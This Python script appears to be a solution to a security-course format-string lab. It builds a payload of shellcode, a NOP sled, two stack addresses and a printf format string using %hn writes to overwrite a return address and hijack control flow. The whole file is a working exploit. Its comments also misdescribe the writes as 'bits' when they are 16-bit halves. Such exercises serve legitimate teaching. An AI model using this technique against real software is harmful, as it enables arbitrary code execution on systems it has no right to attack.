#!/usr/bin/env python3

import sys
import os
from shellcode import shellcode
from struct import pack
# References:
#       https://en.wikipedia.org/wiki/Printf_format_string
#       https://linux.die.net/man/3/printf
# Your code here
padding = (b'\x90')*(129)       # nop sled

## There appears to be 0xA0 (160) bytes of padding.. 

### Want to choose num1 such that 0x8640 = 0xA0 + num1; 
### This will overwrite bottom 4 bits of return address (addr1) with bottom 4
### bits of shellcode address on the stack.
num1 = (b'34208')

num2 = (b'42')      # addr1 is the 42nd argument to printf

### Want to choose num3 such that 0xfffe = (0xA0 + num1) + num3; This will overwrite top 4 bits
### of return address (addr2) with top 4 bits of shellcode address on the stack.
num3 = (b'31166')  

num4 = (b'43')      # addr2 is the 43rd argument to printf

#args =  b"%34208x%42$hn%31166x%43$hn"
#c = b'\x25\x70\x5f'*60
args = (b'\x25') + num1 +(b'\x78\x25')+num2+(b'\x24\x68\x6e\x25')+num3+(b'\x78\x25')+num4+(b'\x24\x68\x6e')


addr1 = pack("<I", 0xfffe8e6c)
addr2 = pack("<I", 0xfffe8e6e)

payload = shellcode + padding + addr1 +padding*0+ addr2 +args
sys.stdout.buffer.write(payload)

